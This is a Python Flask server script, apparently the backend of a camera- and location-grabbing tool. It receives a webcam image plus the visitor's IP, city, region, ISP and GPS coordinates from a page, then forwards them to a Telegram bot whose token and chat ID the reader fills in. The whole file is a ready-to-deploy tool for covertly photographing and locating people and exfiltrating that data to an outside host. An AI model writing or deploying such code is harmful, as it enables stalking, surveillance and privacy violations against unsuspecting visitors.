from flask import Flask, request, jsonify, render_template
import base64
import requests
import time
from datetime import datetime

app = Flask(__name__)

# ====== YOUR TELEGRAM INFO ======
# create bot token chat id paste it here

BOT_TOKEN = ""
CHAT_ID = ""
# =================================


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send", methods=["POST"])
def receive_data():
    data = request.get_json(force=True)

    image_data = data.get("image")
    ip = data.get("ip")
    city = data.get("city")
    region = data.get("region")
    isp = data.get("isp")
    latitude = data.get("lat")
    longitude = data.get("lon")

    # Decode image
    filename = f"capture_{int(time.time())}.png"
    image_bytes = base64.b64decode(image_data.split(",")[1])

    # Send to Telegram
    send_to_telegram(
        image_bytes=image_bytes,
        filename=filename,
        ip=ip,
        city=city,
        region=region,
        isp=isp,
        lat=latitude,
        lon=longitude,
    )

    return jsonify({"status": "ok"})


def send_to_telegram(image_bytes, filename, ip, city, region, isp, lat, lon):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

    info = f"""


IP: {ip}
City: {city}
Region: {region}
ISP: {isp}
Latitude: {lat}
Longitude: {lon}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

    files = {"photo": (filename, image_bytes)}
    data = {"chat_id": CHAT_ID, "caption": info}

    resp = requests.post(url, data=data, files=files)
    print("Telegram status:", resp.status_code)
    print("Telegram response:", resp.text)


# IMPORTANT: no app.run() here on PythonAnywhere
